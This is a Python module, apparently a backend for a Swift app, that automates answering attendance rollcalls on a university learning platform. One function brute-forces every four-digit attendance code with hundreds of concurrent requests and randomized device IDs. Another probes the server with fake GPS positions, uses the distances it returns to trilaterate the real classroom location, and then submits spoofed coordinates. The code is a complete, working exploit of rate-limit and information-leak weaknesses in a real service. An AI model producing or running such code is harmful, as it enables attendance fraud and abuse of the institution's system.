"""
XMU Rollcall verification module for Swift bridge interop.
Handles number code brute-force and radar triangulation rollcall answering.
All functions accept/return JSON strings for easy Swift bridging.
"""

import json
import uuid
import time
import math
import asyncio
import aiohttp
import requests
from aiohttp import CookieJar


BASE_URL = "https://lnt.xmu.edu.cn"
HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    ),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Referer": "https://ids.xmu.edu.cn/authserver/login",
}


def _pad_code(i):
    """Zero-pad a number to 4 digits."""
    return str(i).zfill(4)


def _make_session_from_cookies(cookies_json):
    """Reconstruct a requests.Session from serialized cookies JSON."""
    cookie_dict = json.loads(cookies_json)
    session = requests.Session()
    session.cookies = requests.utils.cookiejar_from_dict(cookie_dict)
    session.headers.update(HEADERS)
    return session


def send_code(cookies_json, rollcall_id):
    """
    Brute-force number code rollcall (0000-9999) using async HTTP.

    Args:
        cookies_json: JSON string of cookie dict
        rollcall_id: Rollcall ID (int or string)

    Returns:
        JSON string:
        {
            "success": true/false,
            "code": "1234",       // the correct code (only on success)
            "time_elapsed": 3.14, // seconds taken
            "error": "..."        // error message (only on failure)
        }
    """
    url = f"{BASE_URL}/api/rollcall/{rollcall_id}/answer_number_rollcall"
    cookie_dict = json.loads(cookies_json)
    t0 = time.time()

    async def _put_request(i, session, stop_flag, answer_url, sem):
        if stop_flag.is_set():
            return None
        async with sem:
            if stop_flag.is_set():
                return None
            payload = {
                "deviceId": str(uuid.uuid4()),
                "numberCode": _pad_code(i),
            }
            try:
                async with session.put(answer_url, json=payload) as r:
                    if r.status == 200:
                        stop_flag.set()
                        return _pad_code(i)
            except Exception:
                pass
            return None

    async def _main():
        stop_flag = asyncio.Event()
        sem = asyncio.Semaphore(200)
        cookie_jar = CookieJar()
        for name, value in cookie_dict.items():
            cookie_jar.update_cookies({name: value})
        async with aiohttp.ClientSession(headers=HEADERS, cookie_jar=cookie_jar) as session:
            tasks = [
                asyncio.create_task(_put_request(i, session, stop_flag, url, sem))
                for i in range(10000)
            ]
            try:
                for coro in asyncio.as_completed(tasks):
                    res = await coro
                    if res is not None:
                        for t in tasks:
                            if not t.done():
                                t.cancel()
                        return res
            finally:
                for t in tasks:
                    if not t.done():
                        t.cancel()
                await asyncio.gather(*tasks, return_exceptions=True)
        return None

    try:
        result_code = asyncio.run(_main())
        elapsed = time.time() - t0
        if result_code is not None:
            return json.dumps({
                "success": True,
                "code": result_code,
                "time_elapsed": round(elapsed, 2),
            })
        else:
            return json.dumps({
                "success": False,
                "error": "All 10000 codes exhausted without match.",
                "time_elapsed": round(elapsed, 2),
            })
    except Exception as e:
        elapsed = time.time() - t0
        return json.dumps({
            "success": False,
            "error": str(e),
            "time_elapsed": round(elapsed, 2),
        })


def send_radar(cookies_json, rollcall_id):
    """
    Answer radar rollcall using triangulation from two probe points.

    Args:
        cookies_json: JSON string of cookie dict
        rollcall_id: Rollcall ID (int or string)

    Returns:
        JSON string:
        {
            "success": true/false,
            "latitude": 24.xxx,    // solved latitude (only on success)
            "longitude": 118.xxx,  // solved longitude (only on success)
            "error": "..."         // error message (only on failure)
        }
    """
    try:
        session = _make_session_from_cookies(cookies_json)
        url = f"{BASE_URL}/api/rollcall/{rollcall_id}/answer"

        lat_1, lat_2 = 24.3, 24.6
        lon_1, lon_2 = 118.0, 118.2

        def _payload(lat, lon):
            return {
                "accuracy": 35,
                "altitude": 0,
                "altitudeAccuracy": None,
                "deviceId": str(uuid.uuid4()),
                "heading": None,
                "latitude": lat,
                "longitude": lon,
                "speed": None,
            }

        # First probe
        res_1 = session.put(url, json=_payload(lat_1, lon_1), headers=HEADERS)
        if res_1.status_code == 200:
            return json.dumps({
                "success": True,
                "latitude": lat_1,
                "longitude": lon_1,
            })
        data_1 = res_1.json()

        # Second probe
        res_2 = session.put(url, json=_payload(lat_2, lon_2), headers=HEADERS)
        if res_2.status_code == 200:
            return json.dumps({
                "success": True,
                "latitude": lat_2,
                "longitude": lon_2,
            })
        data_2 = res_2.json()

        distance_1 = data_1.get("distance")
        distance_2 = data_2.get("distance")

        if distance_1 is None or distance_2 is None:
            return json.dumps({
                "success": False,
                "error": "Server did not return distance data.",
            })

        # Triangulation math
        def _latlon_to_xy(lat, lon, lat0, lon0):
            R = 6371000
            x = math.radians(lon - lon0) * R * math.cos(math.radians(lat0))
            y = math.radians(lat - lat0) * R
            return x, y

        def _xy_to_latlon(x, y, lat0, lon0):
            R = 6371000
            lat = lat0 + math.degrees(y / R)
            lon = lon0 + math.degrees(x / (R * math.cos(math.radians(lat0))))
            return lat, lon

        def _circle_intersections(x1, y1, d1, x2, y2, d2):
            D = math.hypot(x2 - x1, y2 - y1)
            if D > d1 + d2 or D < abs(d1 - d2):
                return None
            a = (d1**2 - d2**2 + D**2) / (2 * D)
            h = math.sqrt(max(0, d1**2 - a**2))
            xm = x1 + a * (x2 - x1) / D
            ym = y1 + a * (y2 - y1) / D
            rx = -(y2 - y1) * (h / D)
            ry = (x2 - x1) * (h / D)
            p1 = (xm + rx, ym + ry)
            p2 = (xm - rx, ym - ry)
            return p1, p2

        def _solve_two_points(la1, lo1, la2, lo2, d1, d2):
            lat0 = (la1 + la2) / 2
            lon0 = (lo1 + lo2) / 2
            x1, y1 = _latlon_to_xy(la1, lo1, lat0, lon0)
            x2, y2 = _latlon_to_xy(la2, lo2, lat0, lon0)
            sols = _circle_intersections(x1, y1, d1, x2, y2, d2)
            if sols is None:
                return None
            p1 = _xy_to_latlon(sols[0][0], sols[0][1], lat0, lon0)
            p2 = _xy_to_latlon(sols[1][0], sols[1][1], lat0, lon0)
            return p1, p2

        resolutions = _solve_two_points(lat_1, lon_1, lat_2, lon_2, distance_1, distance_2)
        if resolutions is None:
            return json.dumps({
                "success": False,
                "error": "Triangulation failed: circles do not intersect.",
            })

        (sol_lat_1, sol_lon_1), (sol_lat_2, sol_lon_2) = resolutions

        # Try first solution
        res_3 = session.put(url, json=_payload(sol_lat_1, sol_lon_1), headers=HEADERS)
        if res_3.status_code == 200:
            return json.dumps({
                "success": True,
                "latitude": sol_lat_1,
                "longitude": sol_lon_1,
            })

        # Try second solution
        res_4 = session.put(url, json=_payload(sol_lat_2, sol_lon_2), headers=HEADERS)
        if res_4.status_code == 200:
            return json.dumps({
                "success": True,
                "latitude": sol_lat_2,
                "longitude": sol_lon_2,
            })

        return json.dumps({
            "success": False,
            "error": "Both triangulation solutions rejected by server.",
        })

    except Exception as e:
        return json.dumps({
            "success": False,
            "error": str(e),
        })
